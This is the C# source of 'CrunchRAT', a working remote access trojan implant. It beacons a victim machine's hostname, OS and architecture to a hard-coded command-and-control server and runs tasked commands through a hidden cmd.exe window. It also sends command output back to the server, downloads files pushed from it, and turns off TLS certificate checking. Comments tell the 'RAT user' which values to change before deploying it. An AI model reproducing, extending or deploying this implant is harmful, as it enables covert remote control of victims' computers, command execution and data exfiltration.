using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using Microsoft.Win32; // Windows Registry
using System.Threading;
using System.IO;
using System.Net;
using System.Diagnostics; // Process creation

namespace CrunchRAT
{
    class Program
    {
        // Main() function
        static void Main(string[] args)
        {
            string c2 = "192.168.1.135";                                                                // NEEDS CHANGED BY THE RAT USER
            string beaconURL = "https://" + c2 + "/beacon.php";                                         // NEEDS CHANGED BY THE RAT USER
            string updateURL = "https://" + c2 + "/update.php";                                         // NEEDS CHANGED BY THE RAT USER
            int beaconInterval = 30000;                                                                 // NEEDS CHANGED BY THE RAT USER

            while (true)
            {
                string hostname = getHostname();                                                        // Gets system hostname
                string os = getOS();                                                                    // Gets system OS
                string architecture = getArchitecture();                                                // Gets system architecture

                string responseString = beacon(beaconURL, hostname, os, architecture);                  // Beacons

                string taskID = String.Empty;                                                           // Initializes variable that will store task ID
                string taskAction = String.Empty;                                                       // Initializes variable that will store task action
                string taskSecondary = String.Empty;                                                    // Initializes variable that will store task secondary
                
                if (responseString.Contains("<action>command<action>"))                                 // If we have a tasked command to execute
                {
                    string output = String.Empty;                                                       // Initializes variable that will store Standard Output
                    string error = String.Empty;                                                        // Initializes variable that will store Standard Error

                    stripOutTaskInfo(responseString, out taskID, out taskAction, out taskSecondary);    // Strips out the task information (ID, action, and secondary) from the beacon response string

                    runCommand(taskSecondary, out output, out error);                                   // Runs the tasked command and stores the result in output and error variables

                    updateCommand(updateURL, taskID, taskAction, taskSecondary, output, error);         // Updates
                }

                if (responseString.Contains("<action>upload<action>"))                                  // If we have a tasked remote file upload (IE: the RAT user uploaded a file to the C2 and we need to download it)
                {
                    stripOutTaskInfo(responseString, out taskID, out taskAction, out taskSecondary);    // Strips out the task information (ID, action, and secondary)

                    getFile(c2, taskSecondary);                                                         // Downloads the uploaded file

                    updateUpload(updateURL, taskID, taskAction, taskSecondary);                         // Updates
                }
                
                // If statement for <action>download<action> - Add in functionality at a later date

                Thread.Sleep(beaconInterval);                                                           // Sleeps for the user-specified interval
            }
        }
        // End of Main() function


        // The getHostname() function will return the system hostname - Working as of 05-03-16
        static string getHostname()
        {
            string hostname = Environment.MachineName;
            return hostname;
        }
        // End of getHostname() function


        // The getOS() function will return the system OS - Working as of 05-03-16
        static string getOS()
        {
            string os = String.Empty;

            using (RegistryKey registryKey = Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Wow6432Node\Microsoft\Windows NT\CurrentVersion")) // Disposable - Gets base OS using the Windows Registry
                os = registryKey.GetValue("ProductName").ToString();

            return os;
        }
        // End of getOS() function


        // The getArchitecture() function will return the system architecture - Working as of 05-03-16
        static string getArchitecture()
        {
            string architecture = String.Empty;

            if (Directory.Exists(Path.GetPathRoot(Environment.SystemDirectory) + @"Windows\SysWOW64")) // This directory will only exist on 64-bit systems - Accounts for volume letters other than C:
                architecture = "x64";
            else
                architecture = "x86";

            return architecture;
        }
        // End of getArchitecture() function


        // The beacon() function will beacon to the specified C2 server and return a task (if any) - Working as of 05-03-16
        static string beacon(string beaconURL, string hostname, string os, string architecture)
        {
            string responseString = String.Empty; // Initializes variable in case the beacon fails or nothing is tasked

            try // Tries to beacon
            {
                 HttpWebRequest beaconRequest = (HttpWebRequest)WebRequest.Create(beaconURL);
                beaconRequest.ServicePoint.Expect100Continue = false; // Removes the "Expect 100-Continue" HTTP header
                ServicePointManager.ServerCertificateValidationCallback = delegate { return true; }; // Ignore self-signed SSL errors
                ServicePointManager.DefaultConnectionLimit = 20; // Normally is limited to 2 concurrent requests - http://en.code-bude.net/2013/01/21/3-things-you-should-know-to-speed-up-httpwebrequest/

                string postData = "hostname=" + Uri.EscapeDataString(hostname) + "&os=" + Uri.EscapeDataString(os) + "&architecture=" + Uri.EscapeDataString(architecture); // URL-encoded POST data
                var data = Encoding.UTF8.GetBytes(postData);
                beaconRequest.Method = "POST";
                beaconRequest.ContentType = "application/x-www-form-urlencoded";
                beaconRequest.ContentLength = data.Length;

                using (var stream = beaconRequest.GetRequestStream()) // Disposable
                    stream.Write(data, 0, data.Length);

                var response = (HttpWebResponse)beaconRequest.GetResponse(); // Gets response from the beacon
                responseString = new StreamReader(response.GetResponseStream()).ReadToEnd();  // Stores the beacon response in responseString
            }
            catch // Research if there's a way to implement try without the catch
            {
            }

            return responseString;
        }
        // End of beacon() function
      
        
        // The stripOutTaskInfo() function will strip out and return task information such as the task ID, the task action, and the task secondary - Working as of 05-04-16
        static void stripOutTaskInfo(string responseString, out string taskID, out string taskAction, out string taskSecondary)
        {
            // Parses out task ID
            string startTag = "<id>";
            int startIndex = responseString.IndexOf(startTag) + startTag.Length;
            int endIndex = responseString.IndexOf("<id>", startIndex);
            taskID = responseString.Substring(startIndex, endIndex - startIndex);

            // Parses out task action
            startTag = "<action>";
            startIndex = responseString.IndexOf(startTag) + startTag.Length;
            endIndex = responseString.IndexOf("<action>", startIndex);
            taskAction = responseString.Substring(startIndex, endIndex - startIndex);

            // Parses out task secondary
            startTag = "<secondary>";
            startIndex = responseString.IndexOf(startTag) + startTag.Length;
            endIndex = responseString.IndexOf("<secondary>", startIndex);
            taskSecondary = responseString.Substring(startIndex, endIndex - startIndex);
        }
        // End of stripOutTaskInfo() function


        // The runCommand() function will run the tasked command and return Standard Output and Standard Error - Working as of 05-04-16
        static void runCommand(string command, out string output, out string error)
        {
            Process cmd = new Process();
            cmd.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
            cmd.StartInfo.UseShellExecute = false; // Must be set to false to redirect Standard Output and Standard Error streams
            cmd.StartInfo.FileName = "cmd.exe";
            cmd.StartInfo.Arguments = "/C " + command;
            cmd.StartInfo.RedirectStandardOutput = true;
            cmd.StartInfo.RedirectStandardError = true;
            cmd.Start();

            output = cmd.StandardOutput.ReadToEnd();
            error = cmd.StandardError.ReadToEnd();
        }
        // End of runCommand() function


        // The updateCommand() function will update the command execution task on the C2 server - Working as of 05-08-16
        static void updateCommand(string updateURL, string taskID, string taskAction, string taskSecondary, string output, string error)
        {
            try // Tries to update
            {
                HttpWebRequest beaconRequest = (HttpWebRequest)WebRequest.Create(updateURL);
                beaconRequest.ServicePoint.Expect100Continue = false; // Removes the "Expect 100-Continue" HTTP header
                ServicePointManager.ServerCertificateValidationCallback = delegate { return true; }; // Ignore self-signed SSL errors
                ServicePointManager.DefaultConnectionLimit = 20; // Normally is limited to 2 concurrent requests - http://en.code-bude.net/2013/01/21/3-things-you-should-know-to-speed-up-httpwebrequest/

                string postData = "id=" + taskID + "&action=" + taskAction + "&secondary=" + Uri.EscapeDataString(taskSecondary) + "&output=" + Uri.EscapeDataString(output) + "&error=" + Uri.EscapeDataString(error); // URL-encoded POST data            
                var data = Encoding.UTF8.GetBytes(postData);
                beaconRequest.Method = "POST";
                beaconRequest.ContentType = "application/x-www-form-urlencoded";
                beaconRequest.ContentLength = data.Length;

                using (var stream = beaconRequest.GetRequestStream()) // Disposable
                    stream.Write(data, 0, data.Length);
            }
            catch // Research if there's a way to implement try without the catch
            {
            }
        }
        // End of updateCommand() function


        // The updateUpload() function will update the remote file upload task on the C2 server - Working as of 05-08-16
        static void updateUpload(string updateURL, string taskID, string taskAction, string taskSecondary)
        {
            try // Tries to update
            {
                HttpWebRequest beaconRequest = (HttpWebRequest)WebRequest.Create(updateURL);
                beaconRequest.ServicePoint.Expect100Continue = false; // Removes the "Expect 100-Continue" HTTP header
                ServicePointManager.ServerCertificateValidationCallback = delegate { return true; }; // Ignore self-signed SSL errors
                ServicePointManager.DefaultConnectionLimit = 20; // Normally is limited to 2 concurrent requests - http://en.code-bude.net/2013/01/21/3-things-you-should-know-to-speed-up-httpwebrequest/

                string postData = "id=" + taskID + "&action=" + taskAction + "&secondary=" + Uri.EscapeDataString(taskSecondary); // URL-encoded POST data            
                var data = Encoding.UTF8.GetBytes(postData);
                beaconRequest.Method = "POST";
                beaconRequest.ContentType = "application/x-www-form-urlencoded";
                beaconRequest.ContentLength = data.Length;

                using (var stream = beaconRequest.GetRequestStream()) // Disposable
                    stream.Write(data, 0, data.Length);
            }
            catch // Research if there's a way to implement try without the catch
            {
            }
        }
        // End of updateUpload() function


        // The getFile() function will download the remote uploaded file - Working as of 05-08-16
        static void getFile(string c2, string taskSecondary)
        {
            string filename = Path.GetFileName(taskSecondary);                                  // Gets just the filename from the taskSecondary file path
    
            using (WebClient wc = new WebClient())
            {
                string resource = "https://" + c2 + taskSecondary;
                wc.DownloadFile(resource, filename);
            }
        }
        // End of getFile() function


        // Additional functions here

    }
}
